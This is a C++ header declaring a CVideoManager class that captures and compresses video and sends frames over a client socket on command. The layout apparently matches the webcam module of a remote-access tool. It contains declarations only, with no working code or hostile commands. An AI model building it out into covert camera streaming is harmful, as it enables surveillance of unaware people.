// VideoManager.h: interface for the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
#define AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "VideoCap.h"
#include "VideoCodec.h"
#include "CaptureVideo.h"
class CVideoManager : public CManager  
{
public:
	void Destroy();
	bool Initialize();
	CVideoManager(CClientSocket *pClient);
	virtual ~CVideoManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendNextScreen();
	bool m_bIsWorking;
private:
	CVideoCap	*m_pVideoCap;
	CVideoCodec	*m_pVideoCodec;
	DWORD	m_fccHandler;
	int	m_nVedioWidth;
	int	m_nVedioHeight;
    CCaptureVideo  m_CapVideo;
	bool m_bIsCompress;
	HANDLE	m_hWorkThread;
	void ResetScreen(int nWidth, int nHeight);
	static DWORD WINAPI WorkThread(LPVOID lparam);

};

#endif // !defined(AFX_VIDEOMANAGER_H__1EE359F0_BFFD_4B8F_A52E_A8DB87656B91__INCLUDED_)
